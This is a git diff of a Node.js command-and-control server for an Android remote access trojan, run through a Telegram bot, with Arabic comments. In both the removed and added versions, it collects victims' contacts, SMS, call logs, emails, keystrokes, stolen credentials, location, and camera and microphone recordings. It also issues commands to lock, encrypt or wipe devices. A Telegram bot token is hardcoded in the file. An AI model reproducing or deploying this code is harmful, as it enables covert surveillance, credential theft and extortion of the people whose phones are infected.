@@ -6,738 +6,352 @@ const uuid4 = require('uuid');
 const multer = require('multer');
 const bodyParser = require('body-parser');
 const axios = require('axios');
-const fs = require('fs');
-const path = require('path');
-const crypto = require('crypto');
 
 // =============== التهيئة ===============
 
 const token = '8987687225:AAEFIlCRyNyOIBJMIwHkNpZSU92L_0QWdu4'
 const id = '6837315281'
-const address = 'https://www.google.com'
+const address = 'https://www.google.com';
 
 const app = express();
-const appServer = http.createServer(app);
-const appSocket = new webSocket.Server({ server: appServer });
-const appBot = new telegramBot(token, { polling: true });
-const appClients = new Map();
-const upload = multer({ dest: 'uploads/' });
+const server = http.createServer(app);
+const wss = new webSocket.Server({ server });
+const bot = new telegramBot(token, { polling: true });
+const clients = new Map();
+const upload = multer();
 
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 
-let currentUuid = '';
-let currentNumber = '';
-let currentTitle = '';
-let currentMessage = '';
-let fileBuffer = null;
+// متغيرات الحالة
+let state = { uuid: '', number: '', title: '', message: '' };
 
-// =============== الصفحة الرئيسية ===============
-app.get('/', function(req, res) {
-    res.send(`
-        <html>
-        <head>
-            <title>RAT Control Panel</title>
-            <style>
-                body { font-family: Arial; background: #1a1a2e; color: white; text-align: center; padding-top: 50px; }
-                h1 { color: #e94560; }
-                .status { background: #16213e; padding: 20px; border-radius: 10px; margin: 20px auto; width: 300px; }
-            </style>
-        </head>
-        <body>
-            <h1>🚀 RAT Advanced Server v3.0</h1>
-            <div class="status">
-                <p>✅ Server Running</p>
-                <p>👥 Connected: <span id="count">0</span></p>
-                <p>⚡ Status: <span style="color: #0f0;">Online</span></p>
-            </div>
-            <script>
-                const ws = new WebSocket('wss://' + location.host);
-                ws.onmessage = (e) => { document.getElementById('count').textContent = e.data; };
-            </script>
-        </body>
-        </html>
-    `);
+// =============== صفحة الفحص ===============
+app.get('/', (req, res) => {
+    res.send(`<h1 style="text-align:center;padding-top:100px;font-family:Arial;">✅ RAT Server Running<br><small>Connected: ${clients.size}</small></h1>`);
 });
 
-// =============== واجهات رفع الملفات ===============
-app.post('/uploadFile', upload.single('file'), (req, res) => {
-    const fileName = req.file.originalname;
-    appBot.sendDocument(id, req.file.buffer, {
-        caption: `°• 📁 ملف من <b>${req.headers.model}</b>\n• 📄 ${fileName}\n• 📦 ${req.file.size} bytes`,
-        parse_mode: 'HTML'
-    }, { filename: fileName, contentType: 'application/octet-stream' });
-    res.send('OK');
+// =============== استقبال البيانات من جهاز الأندرويد ===============
+app.post('/api/upload', upload.any(), (req, res) => {
+    const deviceId = req.headers['x-device-id'] || 'unknown';
+    const type = req.body.type || req.headers['x-type'] || 'text';
+    const deviceModel = req.headers['x-model'] || 'Unknown';
+    const data = req.body.data || req.body.text || '';
+    const file = req.files ? req.files[0] : null;
+
+    console.log(`📩 استقبال: ${type} من ${deviceModel}`);
+
+    try {
+        switch(type) {
+            case 'contacts':
+                bot.sendDocument(adminId, Buffer.from(data), {
+                    caption: `📞 جهات اتصال من <b>${deviceModel}</b>`,
+                    parse_mode: 'HTML'
+                }, { filename: `contacts_${Date.now()}.txt`, contentType: 'text/plain' });
+                sendSuccess(adminId, `📞 تم استلام جهات الاتصال من <b>${deviceModel}</b> ✅`);
+                break;
+
+            case 'calls':
+                bot.sendDocument(adminId, Buffer.from(data), {
+                    caption: `📞 سجل المكالمات من <b>${deviceModel}</b>`,
+                    parse_mode: 'HTML'
+                }, { filename: `calls_${Date.now()}.txt`, contentType: 'text/plain' });
+                sendSuccess(adminId, `📞 تم استلام سجل المكالمات من <b>${deviceModel}</b> ✅`);
+                break;
+
+            case 'sms':
+                bot.sendDocument(adminId, Buffer.from(data), {
+                    caption: `💬 جميع الرسائل من <b>${deviceModel}</b>`,
+                    parse_mode: 'HTML'
+                }, { filename: `sms_${Date.now()}.txt`, contentType: 'text/plain' });
+                sendSuccess(adminId, `💬 تم استلام الرسائل من <b>${deviceModel}</b> ✅`);
+                break;
+
+            case 'emails':
+                bot.sendDocument(adminId, Buffer.from(data), {
+                    caption: `📧 البريد الإلكتروني من <b>${deviceModel}</b>`,
+                    parse_mode: 'HTML'
+                }, { filename: `emails_${Date.now()}.txt`, contentType: 'text/plain' });
+                sendSuccess(adminId, `📧 تم استلام البريد الإلكتروني من <b>${deviceModel}</b> ✅`);
+                break;
+
+            case 'apps':
+                bot.sendDocument(adminId, Buffer.from(data), {
+                    caption: `📱 تطبيقات <b>${deviceModel}</b>`,
+                    parse_mode: 'HTML'
+                }, { filename: `apps_${Date.now()}.txt`, contentType: 'text/plain' });
+                sendSuccess(adminId, `📱 تم استلام التطبيقات من <b>${deviceModel}</b> ✅`);
+                break;
+
+            case 'device_info':
+                bot.sendMessage(adminId, 
+                    `ℹ️ <b>معلومات جهاز</b>\n━━━━━━━━━━━━━━\n${data}`,
+                    { parse_mode: 'HTML' }
+                );
+                sendSuccess(adminId, `ℹ️ تم استلام معلومات <b>${deviceModel}</b> ✅`);
+                break;
+
+            case 'clipboard':
+                bot.sendMessage(adminId,
+                    `📋 <b>محتويات الحافظة</b> من <b>${deviceModel}</b>\n━━━━━━━━━━━━━━\n${data || '(فارغة)'}`,
+                    { parse_mode: 'HTML' }
+                );
+                break;
+
+            case 'location':
+                const [lat, lon] = data.split(',');
+                if (lat && lon) {
+                    bot.sendLocation(adminId, parseFloat(lat), parseFloat(lon));
+                    bot.sendMessage(adminId,
+                        `📍 موقع <b>${deviceModel}</b>\n🌐 https://maps.google.com/?q=${lat},${lon}`,
+                        { parse_mode: 'HTML' }
+                    );
+                }
+                break;
+
+            case 'screenshot':
+                if (file) {
+                    bot.sendPhoto(adminId, file.buffer, {
+                        caption: `📸 لقطة شاشة من <b>${deviceModel}</b>`,
+                        parse_mode: 'HTML'
+                    });
+                }
+                break;
+
+            case 'photo':
+                if (file) {
+                    bot.sendPhoto(adminId, file.buffer, {
+                        caption: `📸 صورة من كاميرا <b>${deviceModel}</b>`,
+                        parse_mode: 'HTML'
+                    });
+                }
+                break;
+
+            case 'video':
+                if (file) {
+                    bot.sendVideo(adminId, file.buffer, {
+                        caption: `🎥 فيديو من كاميرا <b>${deviceModel}</b>`,
+                        parse_mode: 'HTML'
+                    });
+                }
+                break;
+
+            case 'audio':
+                if (file) {
+                    bot.sendVoice(adminId, file.buffer, {
+                        caption: `🎤 تسجيل صوتي من <b>${deviceModel}</b>`,
+                        parse_mode: 'HTML'
+                    });
+                }
+                break;
+
+            case 'file':
+                if (file) {
+                    bot.sendDocument(adminId, file.buffer, {
+                        caption: `📁 ملف من <b>${deviceModel}</b>\n📄 ${file.originalname}`,
+                        parse_mode: 'HTML'
+                    }, { filename: file.originalname, contentType: file.mimetype });
+                }
+                break;
+
+            case 'credentials':
+                bot.sendMessage(adminId,
+                    `💳 <b>حسابات مسروقة</b> من <b>${deviceModel}</b>\n━━━━━━━━━━━━━━\n${data}`,
+                    { parse_mode: 'HTML' }
+                );
+                break;
+
+            case 'keylog':
+                bot.sendMessage(adminId,
+                    `⌨️ <b>ضغطات المفاتيح</b> من <b>${deviceModel}</b>\n━━━━━━━━━━━━━━\n<code>${data}</code>`,
+                    { parse_mode: 'HTML' }
+                );
+                break;
+
+            case 'notification':
+                const [app, notifTitle, notifBody] = (data || '').split('|');
+                bot.sendMessage(adminId,
+                    `🔔 <b>إشعار</b> من <b>${deviceModel}</b>\n• 📱 ${app || 'غير معروف'}\n• 📌 ${notifTitle || ''}\n• 📄 ${notifBody || ''}`,
+                    { parse_mode: 'HTML' }
+                );
+                break;
+
+            case 'photos_list':
+                bot.sendDocument(adminId, Buffer.from(data), {
+                    caption: `🖼️ قائمة الصور من <b>${deviceModel}</b> (أرسل المسار لتحميل صورة معينة)`,
+                    parse_mode: 'HTML'
+                }, { filename: `photos_${Date.now()}.txt`, contentType: 'text/plain' });
+                bot.sendMessage(adminId,
+                    '📌 للتحميل: استخدم أمر "تنزيل ملف" وأدخل المسار الكامل للصورة',
+                    { parse_mode: 'HTML' }
+                );
+                break;
+
+            case 'status':
+                bot.sendMessage(adminId, 
+                    `📊 <b>حالة الجهاز</b> <b>${deviceModel}</b>\n${data}`,
+                    { parse_mode: 'HTML' }
+                );
+                break;
+
+            case 'encrypted':
+                bot.sendMessage(adminId, 
+                    `🔐 <b>تم تشفير الملفات</b> على <b>${deviceModel}</b> بنجاح!`,
+                    { parse_mode: 'HTML' }
+                );
+                break;
+
+            case 'formatted':
+                bot.sendMessage(adminId,
+                    `💣 <b>تم فرمتة</b> جهاز <b>${deviceModel}</b> بنجاح! 💀`,
+                    { parse_mode: 'HTML' }
+                );
+                break;
+
+            case 'locked':
+                bot.sendMessage(adminId,
+                    `🔒 <b>تم قفل</b> جهاز <b>${deviceModel}</b> بنجاح!`,
+                    { parse_mode: 'HTML' }
+                );
+                break;
+
+            default:
+                bot.sendMessage(adminId,
+                    `📩 بيانات من <b>${deviceModel}</b>\n━━━━━━━━━━━━━━\n${data}`,
+                    { parse_mode: 'HTML' }
+                );
+        }
+    } catch (err) {
+        console.error('❌ خطأ في معالجة البيانات:', err.message);
+        bot.sendMessage(adminId, `❌ خطأ: ${err.message}`);
+    }
+
+    res.json({ status: 'ok' });
 });
 
-app.post('/uploadText', (req, res) => {
-    appBot.sendMessage(id, 
-        `°• 📝 رسالة من <b>${req.headers.model}</b>\n━━━━━━━━━━━━━━\n${req.body.text}`,
-        { parse_mode: 'HTML' }
-    );
-    res.send('OK');
-});
+// =============== WebSocket للاتصال الفوري ===============
+wss.on('connection', (ws, req) => {
+    const deviceId = uuid4.v4();
+    const model = req.headers['x-model'] || 'Unknown';
+    const battery = req.headers['x-battery'] || '0';
+    const version = req.headers['x-version'] || 'Unknown';
+    const provider = req.headers['x-provider'] || 'Unknown';
+    const imei = req.headers['x-imei'] || 'Unknown';
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
-app.post('/uploadLocation', (req, res) => {
-    appBot.sendLocation(id, req.body.lat, req.body.lon);
-    appBot.sendMessage(id, `°• 📍 موقع من <b>${req.headers.model}</b>`, { parse_mode: 'HTML' });
-    res.send('OK');
-});
+    ws.deviceId = deviceId;
+    ws.model = model;
 
-app.post('/uploadScreenshot', upload.single('screenshot'), (req, res) => {
-    appBot.sendPhoto(id, req.file.buffer, {
-        caption: `°• 📸 لقطة شاشة من <b>${req.headers.model}</b>\n• 🕐 ${new Date().toISOString()}`,
-        parse_mode: 'HTML'
+    clients.set(deviceId, {
+        model, battery, version, provider, imei, ip,
+        connectedAt: Date.now(), ws, uuid: deviceId
     });
-    res.send('OK');
-});
 
-app.post('/uploadCredentials', (req, res) => {
-    const creds = req.body;
-    appBot.sendMessage(id,
-        `°• 💳 حسابات مسروقة من <b>${req.headers.model}</b>\n` +
-        `━━━━━━━━━━━━━━\n` +
-        `• 📧 البريد: <code>${creds.email || 'N/A'}</code>\n` +
-        `• 🔑 كلمة السر: <code>${creds.password || 'N/A'}</code>\n` +
-        `• 🌐 الموقع: ${creds.url || 'N/A'}\n` +
-        `• 🕐 الوقت: ${creds.timestamp || 'N/A'}`,
-        { parse_mode: 'HTML' }
-    );
-    res.send('OK');
-});
+    console.log(`✅ جهاز متصل: ${model} (${deviceId.substring(0, 8)}...)`);
 
-// =============== WebSocket Connection ===============
-appSocket.on('connection', (socket, req) => {
-    const uuid = uuid4.v4();
-    const deviceModel = req.headers.model || 'Unknown';
-    const deviceBattery = req.headers.battery || 'N/A';
-    const deviceVersion = req.headers.version || 'N/A';
-    const deviceBrightness = req.headers.brightness || 'N/A';
-    const deviceProvider = req.headers.provider || 'N/A';
-    const deviceIMEI = req.headers.imei || 'N/A';
-    const deviceIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-
-    socket.uuid = uuid;
-    
-    appClients.set(uuid, {
-        model: deviceModel,
-        battery: deviceBattery,
-        version: deviceVersion,
-        brightness: deviceBrightness,
-        provider: deviceProvider,
-        imei: deviceIMEI,
-        ip: deviceIP,
-        connectedAt: new Date().toISOString(),
-        lastActivity: new Date().toISOString(),
-        uuid: uuid
-    });
-
-    // إشعار بالاتصال الجديد
-    appBot.sendMessage(id,
-        `🚨 <b>جهاز جديد متصل!</b>\n━━━━━━━━━━━━━━\n` +
-        `• 📱 الموديل: <b>${deviceModel}</b>\n` +
-        `• 🔋 البطارية: ${deviceBattery}%\n` +
-        `• 🤖 أندرويد: ${deviceVersion}\n` +
-        `• ☀️ السطوع: ${deviceBrightness}\n` +
-        `• 📶 الشريحة: ${deviceProvider}\n` +
-        `• 🆔 IMEI: <code>${deviceIMEI}</code>\n` +
-        `• 🌐 IP: ${deviceIP}\n` +
-        `• 🆔 UUID: <code>${uuid}</code>\n` +
-        `• 🕐 ${new Date().toLocaleString('ar-EG')}`,
+    bot.sendMessage(adminId,
+        `✅ <b>جهاز جديد متصل!</b>\n` +
+        `📱 ${model}\n` +
+        `🔋 ${battery}%\n` +
+        `🤖 ${version}\n` +
+        `📶 ${provider}\n` +
+        `🆔 <code>${deviceId.substring(0, 8)}</code>\n` +
+        `🕐 ${new Date().toLocaleString('ar-EG')}`,
         { parse_mode: 'HTML' }
     );
 
-    // عند قطع الاتصال
-    socket.on('close', function() {
-        appBot.sendMessage(id,
-            `❌ <b>جهاز انقطع الاتصال</b>\n━━━━━━━━━━━━━━\n` +
-            `• 📱 الموديل: <b>${deviceModel}</b>\n` +
-            `• 🆔 UUID: <code>${uuid}</code>\n` +
-            `• 🕐 ${new Date().toLocaleString('ar-EG')}`,
+    ws.on('close', () => {
+        clients.delete(deviceId);
+        bot.sendMessage(adminId,
+            `❌ <b>جهاز انقطع:</b> ${model}\n🆔 <code>${deviceId.substring(0, 8)}</code>`,
             { parse_mode: 'HTML' }
         );
-        appClients.delete(socket.uuid);
     });
 
-    // استقبال رسائل من الجهاز
-    socket.on('message', function(data) {
-        const message = data.toString();
-        console.log(`📩 من ${deviceModel}: ${message.substring(0, 100)}`);
-        
-        if (message.startsWith('screenshot:')) {
-            const base64Data = message.split(':')[1];
-            if (base64Data) {
-                const imgBuffer = Buffer.from(base64Data, 'base64');
-                appBot.sendPhoto(id, imgBuffer, {
-                    caption: `°• 📸 لقطة شاشة من <b>${deviceModel}</b>\n• 🕐 ${new Date().toISOString()}`,
+    ws.on('message', (data) => {
+        try {
+            const msg = data.toString();
+            console.log(`📩 WebSocket من ${model}: ${msg.substring(0, 80)}`);
+            
+            // معالجة رسائل WebSocket المباشرة
+            if (msg.startsWith('contacts:')) {
+                bot.sendDocument(adminId, Buffer.from(msg.substring(9)), {
+                    caption: `📞 جهات اتصال من <b>${model}</b>`,
                     parse_mode: 'HTML'
-                });
+                }, { filename: `contacts_${deviceId}.txt` });
+                bot.sendMessage(adminId, `✅ تم استلام جهات اتصال <b>${model}</b>`, { parse_mode: 'HTML' });
             }
-        }
-        else if (message.startsWith('keylog:')) {
-            const keyData = message.split(':')[1];
-            appBot.sendMessage(id,
-                `°• ⌨️ ضغطات المفاتيح من <b>${deviceModel}</b>\n━━━━━━━━━━━━━━\n<code>${keyData}</code>`,
-                { parse_mode: 'HTML' }
-            );
-        }
-        else if (message.startsWith('notification:')) {
-            const notifData = message.substring(13);
-            const [appName, title, content] = notifData.split('|');
-            appBot.sendMessage(id,
-                `°• 🔔 إشعار جديد من <b>${deviceModel}</b>\n` +
-                `• 📱 التطبيق: ${appName}\n` +
-                `• 📌 العنوان: ${title}\n` +
-                `• 📄 المحتوى: ${content}`,
-                { parse_mode: 'HTML' }
-            );
-        }
-        else if (message.startsWith('email:')) {
-            const emailData = message.substring(6);
-            const [from, subject, body] = emailData.split('|');
-            appBot.sendMessage(id,
-                `°• 📧 بريد إلكتروني من <b>${deviceModel}</b>\n` +
-                `• 👤 من: ${from}\n` +
-                `• 📌 الموضوع: ${subject}\n` +
-                `• 📄 المحتوى: ${body}`,
-                { parse_mode: 'HTML' }
-            );
-        }
-        else if (message.startsWith('encrypted:')) {
-            appBot.sendMessage(id,
-                `°• 🔐 تم تشفير ملفات <b>${deviceModel}</b> بنجاح!`,
-                { parse_mode: 'HTML' }
-            );
-        }
-        else if (message.startsWith('formatted:')) {
-            appBot.sendMessage(id,
-                `°• ⚙️ تم فرمتة جهاز <b>${deviceModel}</b> بنجاح! 💀`,
-                { parse_mode: 'HTML' }
-            );
-        }
-        else if (message.startsWith('locked:')) {
-            appBot.sendMessage(id,
-                `°• 🔒 تم قفل جهاز <b>${deviceModel}</b> بنجاح!`,
-                { parse_mode: 'HTML' }
-            );
-        }
-        else if (message.startsWith('device_info:')) {
-            const info = message.substring(12);
-            appBot.sendMessage(id,
-                `°• ℹ️ معلومات جهاز <b>${deviceModel}</b>\n━━━━━━━━━━━━━━\n${info}`,
-                { parse_mode: 'HTML' }
-            );
-        }
-        else if (message.startsWith('contacts:')) {
-            const contacts = message.substring(9);
-            const contactsFile = Buffer.from(contacts, 'utf-8');
-            appBot.sendDocument(id, contactsFile, {
-                caption: `°• 📞 جهات اتصال من <b>${deviceModel}</b>`,
-                parse_mode: 'HTML'
-            }, { filename: `contacts_${uuid}.txt`, contentType: 'text/plain' });
-        }
-        else if (message.startsWith('calls:')) {
-            const calls = message.substring(6);
-            const callsFile = Buffer.from(calls, 'utf-8');
-            appBot.sendDocument(id, callsFile, {
-                caption: `°• 📞 سجل المكالمات من <b>${deviceModel}</b>`,
-                parse_mode: 'HTML'
-            }, { filename: `calls_${uuid}.txt`, contentType: 'text/plain' });
-        }
-        else if (message.startsWith('sms:')) {
-            const sms = message.substring(4);
-            const smsFile = Buffer.from(sms, 'utf-8');
-            appBot.sendDocument(id, smsFile, {
-                caption: `°• 💬 جميع الرسائل من <b>${deviceModel}</b>`,
-                parse_mode: 'HTML'
-            }, { filename: `sms_${uuid}.txt`, contentType: 'text/plain' });
-        }
-        else if (message.startsWith('audio:')) {
-            const audioData = message.split(':')[1];
-            if (audioData) {
-                const audioBuffer = Buffer.from(audioData, 'base64');
-                appBot.sendVoice(id, audioBuffer, {
-                    caption: `°• 🎤 تسجيل صوتي من <b>${deviceModel}</b>`,
+            else if (msg.startsWith('calls:')) {
+                bot.sendDocument(adminId, Buffer.from(msg.substring(6)), {
+                    caption: `📞 سجل مكالمات من <b>${model}</b>`,
                     parse_mode: 'HTML'
-                });
+                }, { filename: `calls_${deviceId}.txt` });
+                bot.sendMessage(adminId, `✅ تم استلام سجل مكالمات <b>${model}</b>`, { parse_mode: 'HTML' });
             }
-        }
-        else if (message.startsWith('video:')) {
-            const videoData = message.split(':')[1];
-            if (videoData) {
-                const videoBuffer = Buffer.from(videoData, 'base64');
-                appBot.sendVideo(id, videoBuffer, {
-                    caption: `°• 🎥 فيديو من كاميرا <b>${deviceModel}</b>`,
+            else if (msg.startsWith('sms:')) {
+                bot.sendDocument(adminId, Buffer.from(msg.substring(4)), {
+                    caption: `💬 رسائل من <b>${model}</b>`,
                     parse_mode: 'HTML'
-                });
+                }, { filename: `sms_${deviceId}.txt` });
+                bot.sendMessage(adminId, `✅ تم استلام رسائل <b>${model}</b>`, { parse_mode: 'HTML' });
             }
-        }
-        else if (message.startsWith('photos:')) {
-            const photoData = message.split(':')[1];
-            if (photoData) {
-                const photoBuffer = Buffer.from(photoData, 'base64');
-                appBot.sendPhoto(id, photoBuffer, {
-                    caption: `°• 🖼️ صورة من <b>${deviceModel}</b>`,
-                    parse_mode: 'HTML'
-                });
+            else if (msg.startsWith('info:')) {
+                bot.sendMessage(adminId, `ℹ️ <b>${model}</b>\n${msg.substring(5)}`, { parse_mode: 'HTML' });
+                bot.sendMessage(adminId, `✅ تم استلام معلومات <b>${model}</b>`, { parse_mode: 'HTML' });
             }
-        }
-        else if (message.startsWith('file:')) {
-            const parts = message.split(':');
-            const fileName = parts[1];
-            const fileData = parts[2];
-            if (fileData) {
-                const fileBuffer = Buffer.from(fileData, 'base64');
-                appBot.sendDocument(id, fileBuffer, {
-                    caption: `°• 📁 ملف من <b>${deviceModel}</b>\n• 📄 ${fileName}`,
-                    parse_mode: 'HTML'
-                }, { filename: fileName, contentType: 'application/octet-stream' });
-            }
-        }
-        else if (message.startsWith('clipboard:')) {
-            const clipData = message.substring(10);
-            appBot.sendMessage(id,
-                `°• 📋 محتوى الحافظة من <b>${deviceModel}</b>\n━━━━━━━━━━━━━━\n${clipData}`,
-                { parse_mode: 'HTML' }
-            );
-        }
-        else if (message.startsWith('location:')) {
-            const parts = message.split(':');
-            const lat = parseFloat(parts[1]);
-            const lon = parseFloat(parts[2]);
-            if (!isNaN(lat) && !isNaN(lon)) {
-                appBot.sendLocation(id, lat, lon);
-                appBot.sendMessage(id,
-                    `°• 📍 موقع <b>${deviceModel}</b>\n• 🌐 https://maps.google.com/?q=${lat},${lon}`,
-                    { parse_mode: 'HTML' }
-                );
-            }
-        }
-        else if (message.startsWith('apps:')) {
-            const apps = message.substring(5);
-            const appsFile = Buffer.from(apps, 'utf-8');
-            appBot.sendDocument(id, appsFile, {
-                caption: `°• 📱 تطبيقات <b>${deviceModel}</b>`,
-                parse_mode: 'HTML'
-            }, { filename: `apps_${uuid}.txt`, contentType: 'text/plain' });
-        }
-        else if (message.startsWith('pong')) {
-            // استجابة ping
-        }
-        else {
-            appBot.sendMessage(id,
-                `°• 📩 رسالة غير معروفة من <b>${deviceModel}</b>\n━━━━━━━━━━━━━━\n<code>${message}</code>`,
-                { parse_mode: 'HTML' }
-            );
-        }
-    });
-});
-
-// =============== بوت التيليغرام - معالجة الأوامر ===============
-appBot.on('message', (msg) => {
-    const chatId = msg.chat.id;
-    const text = msg.text || '';
-
-    // ===== التعامل مع الردود =====
-    if (msg.reply_to_message) {
-        const replyText = msg.reply_to_message.text || '';
-        
-        // إرسال رسالة نصية قصيرة (SMS)
-        if (replyText.includes('°• يرجى الرد على الرقم الذي تريد إرسال الرسالة القصيرة إلي')) {
-            currentNumber = text;
-            appBot.sendMessage(id,
-                '°• 💬 رائع! أدخل الآن الرسالة التي تريد إرسالها\n\n⚠️ ملاحظة: الرسالة ستُرسل كـ SMS عادية',
-                { reply_markup: { force_reply: true } }
-            );
-        }
-        
-        // إرسال الرسالة النصية
-        if (replyText.includes('°• 💬 رائع! أدخل الآن الرسالة التي تريد إرسالها')) {
-            sendCommandToClient(`send_message:${currentNumber}:${text}:`);
-            currentNumber = '';
-            currentUuid = '';
-            showMainMenu('✅ تم إرسال الرسالة بنجاح!');
-        }
-
-        // إرسال رسالة لجميع جهات الاتصال
-        if (replyText.includes('°• أدخل الرسالة التي تريد إرسالها إلى جميع جهات الاتصال')) {
-            sendCommandToClient(`send_message_to_all:${text}:`);
-            currentUuid = '';
-            showMainMenu('✅ تم إرسال الرسالة للجميع!');
-        }
-
-        // تنزيل ملف
-        if (replyText.includes('°• أدخل مسار الملف الذي تريد تنزيله')) {
-            sendCommandToClient(`file:${text}:`);
-            currentUuid = '';
-            showMainMenu('⏳ جاري تحميل الملف...');
-        }
-
-        // حذف ملف
-        if (replyText.includes('°• أدخل مسار الملف الذي تريد حذفه')) {
-            sendCommandToClient(`delete_file:${text}:`);
-            currentUuid = '';
-            showMainMenu('🗑️ تم حذف الملف بنجاح!');
-        }
-
-        // تسجيل ميكروفون
-        if (replyText.includes('أدخل المدة (بالثواني) التي تريد تسجيل الميكروفون فيها')) {
-            const time = parseInt(text);
-            if (time > 0 && time <= 300) {
-                sendCommandToClient(`microphone:${time}:`);
-                currentUuid = '';
-                showMainMenu(`🎤 جاري التسجيل لمدة ${time} ثانية...`);
-            } else {
-                appBot.sendMessage(id, '❌ يجب أن تكون المدة بين 1 و 300 ثانية');
-            }
-        }
-
-        // تسجيل فيديو كاميرا خلفية
-        if (replyText.includes('أدخل المدة (بالثواني) لتسجيل الكاميرا الخلفية')) {
-            const time = parseInt(text);
-            if (time > 0 && time <= 60) {
-                sendCommandToClient(`video_main:${time}:`);
-                currentUuid = '';
-                showMainMenu(`🎥 جاري تسجيل الفيديو لمدة ${time} ثانية...`);
-            } else {
-                appBot.sendMessage(id, '❌ يجب أن تكون المدة بين 1 و 60 ثانية');
-            }
-        }
-
-        // تسجيل فيديو كاميرا أمامية
-        if (replyText.includes('أدخل المدة (بالثواني) لتسجيل الكاميرا الأمامية')) {
-            const time = parseInt(text);
-            if (time > 0 && time <= 60) {
-                sendCommandToClient(`video_selfie:${time}:`);
-                currentUuid = '';
-                showMainMenu(`🎥 جاري تسجيل السيلفي لمدة ${time} ثانية...`);
-            } else {
-                appBot.sendMessage(id, '❌ يجب أن تكون المدة بين 1 و 60 ثانية');
-            }
-        }
-
-        // رسالة Toast
-        if (replyText.includes('°• أدخل الرسالة التي تريد ظهورها على الجهاز المستهدف')) {
-            sendCommandToClient(`toast:${text}:`);
-            currentUuid = '';
-            showMainMenu('✅ تم عرض الرسالة!');
-        }
-
-        // إشعار
-        if (replyText.includes('°• أدخل عنوان الإشعار الذي تريد إرساله')) {
-            currentTitle = text;
-            appBot.sendMessage(id,
-                '°• الآن أدخل محتوى الإشعار\n\n⚠️ سيظهر كإشعار عادي على الجهاز',
-                { reply_markup: { force_reply: true } }
-            );
-        }
-
-        if (replyText.includes('°• الآن أدخل محتوى الإشعار')) {
-            sendCommandToClient(`show_notification:${currentTitle}:${text}:`);
-            currentTitle = '';
-            currentUuid = '';
-            showMainMenu('✅ تم إرسال الإشعار!');
-        }
-
-        // رابط للفتح
-        if (replyText.includes('°• أدخل الرابط الذي تريد فتحه على جهاز الضحية')) {
-            sendCommandToClient(`open_url:${text}:`);
-            currentUuid = '';
-            showMainMenu('✅ تم فتح الرابط!');
-        }
-
-        // رابط صوت
-        if (replyText.includes('°• أدخل رابط الصوت الذي تريد تشغيله')) {
-            sendCommandToClient(`play_audio:${text}:`);
-            currentUuid = '';
-            showMainMenu('🔊 جاري تشغيل الصوت...');
-        }
-
-        // كود قفل الشاشة
-        if (replyText.includes('°• أدخل رمز القفل المكون من 4 أرقام')) {
-            if (/^\d{4}$/.test(text)) {
-                sendCommandToClient(`lock_device:${text}:`);
-                currentUuid = '';
-                showMainMenu(`🔒 تم قفل الجهاز بالرمز ${text}!`);
-            } else {
-                appBot.sendMessage(id, '❌ الرمز يجب أن يكون 4 أرقام فقط');
-            }
-        }
-
-        // تنبيه عند الوصول للردود
-        if (replyText.includes('°• رائع! أدخل الآن')) {
-            // معالجة عامة لأي ردود أخرى
-        }
-    }
-
-    // ===== الأوامر الرئيسية =====
-    if (id == chatId) {
-        if (text == '/start') {
-            showMainMenu('👋 مرحبا بك في بوت الاختراق المتطور v3.0');
-        }
-
-        if (text == 'الأجهزة المتصلة🤖' || text == '📱 الأجهزة المتصلة') {
-            if (appClients.size == 0) {
-                appBot.sendMessage(id,
-                    '❌ <b>لا توجد أجهزة متصلة!</b>\n\n' +
-                    '⚠️ تأكد من أن التطبيق مثبت على جهاز الضحية وأن الجهاز متصل بالإنترنت',
-                    { parse_mode: 'HTML' }
-                );
-            } else {
-                let devicesList = '📱 <b>قائمة الأجهزة المتصلة</b>\n━━━━━━━━━━━━━━\n\n';
-                let count = 1;
-                appClients.forEach(function(client, uuid) {
-                    devicesList +=
-                        `🆔 ${count++}\n` +
-                        `• الموديل: <b>${client.model}</b>\n` +
-                        `• البطارية: ${client.battery}% 🔋\n` +
-                        `• أندرويد: ${client.version}\n` +
-                        `• متصل منذ: ${client.connectedAt}\n` +
-                        `• 🆔 <code>${uuid.substring(0, 8)}...</code>\n\n`;
-                });
-                devicesList += `━━━━━━━━━━━━━━\n📊 المجموع: ${appClients.size} أجهزة`;
-                appBot.sendMessage(id, devicesList, { parse_mode: 'HTML' });
-            }
-        }
-
-        if (text == 'قائمة الأوامر🕹' || text == '⚙️ لوحة التحكم') {
-            if (appClients.size == 0) {
-                appBot.sendMessage(id,
-                    '❌ لا توجد أجهزة متصلة!\n⚠️ قم بتوصيل جهاز أولاً',
-                    { parse_mode: 'HTML' }
-                );
-            } else {
-                const inlineButtons = [];
-                appClients.forEach(function(client, uuid) {
-                    inlineButtons.push([
-                        { text: `${client.model} (🔋${client.battery}%)`, callback_data: 'device:' + uuid }
-                    ]);
-                });
-                appBot.sendMessage(id, '⚙️ <b>اختر الجهاز للتحكم به:</b>', {
-                    parse_mode: 'HTML',
-                    reply_markup: {
-                        inline_keyboard: inlineButtons
-                    }
-                });
-            }
-        }
-
-        if (text == '📊 الإحصائيات') {
-            appBot.sendMessage(id,
-                `📊 <b>إحصائيات البوت</b>\n━━━━━━━━━━━━━━\n` +
-                `• 👥 الأجهزة المتصلة: ${appClients.size}\n` +
-                `• ⏱ يعمل منذ: تشغيل مستمر\n` +
-                `• 📡 الحالة: نشط ✅\n` +
-                `• 🆔 البوت: @KingRATBot\n` +
-                `• 👤 المطور: @king_1_4`,
-                { parse_mode: 'HTML' }
-            );
-        }
-    } else {
-        appBot.sendMessage(id, '❌ أنت غير مصرح باستخدام هذا البوت!');
-    }
-});
-
-// =============== معالجة الأزرار (Callback Queries) ===============
-appBot.on('callback_query', (callbackQuery) => {
-    const msg = callbackQuery.message;
-    const data = callbackQuery.data;
-    const prefix = data.split(':')[0];
-    const uuid = data.split(':')[1];
-    const client = appClients.get(uuid);
-
-    if (!client) {
-        appBot.answerCallbackQuery(callbackQuery.id, { text: '❌ الجهاز غير متصل!', show_alert: true });
-        return;
-    }
-
-    if (prefix == 'device') {
-        const deviceInfo = appClients.get(uuid);
-        appBot.editMessageText(
-            `⚙️ <b>لوحة تحكم ${deviceInfo.model}</b>\n━━━━━━━━━━━━━━\n` +
-            `• 🔋 البطارية: ${deviceInfo.battery}%\n` +
-            `• 📶 الشبكة: ${deviceInfo.provider}\n` +
-            `• 🆔 ${uuid.substring(0, 8)}...\n` +
-            `━━━━━━━━━━━━━━\n<b>اختر الأمر:</b>`,
-            {
-                chat_id: id,
-                message_id: msg.message_id,
